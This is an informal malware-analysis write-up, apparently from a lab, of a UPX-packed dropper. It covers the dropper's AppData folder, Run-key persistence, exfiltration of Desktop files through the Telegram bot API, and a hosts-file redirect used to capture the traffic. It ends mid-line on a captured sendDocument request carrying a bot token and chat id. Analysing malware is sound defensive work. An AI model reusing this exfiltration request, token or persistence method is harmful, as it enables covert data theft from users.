At the company, our network team noticed a big increase in network activity on one of our computers in the last few days. After looking into it, we found out that an employee had downloaded untrusted software, but they weren't sure what it was doing. We need you to investigate carefully and find out what it does.


1-malware packer used here 

with DIE we find it was upx

2-using procomon and monitroing file changes we find the malware write 
C:\Users\Administrator\AppData\Roaming\Dropper

3-same using procmon with reg and famous prestiee keys used for it 
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
4- dir used to exfiled 
C:\Users\Administrator\Desktop

5-using procmon and wireshark we get an api (we can use other tools for dumping bue we dont have acess to hem in this lab )
using the ip we find that 

api.telegram.org


6.a smart way to get the exfiled data with telegram bots but the uri is only sent after connection is sent and tls so we can't get it with wireshark

using the C:/windows/system32/drivers/etc/hosts

with api.telegram.org and then setuping python -m http.server 80 we can get the request 

"GET /bot6369451776:AAEYgeQO4Onl5XIHhXTtzvcNOMahPNhhlZo/sendDocument?chat_id=7389421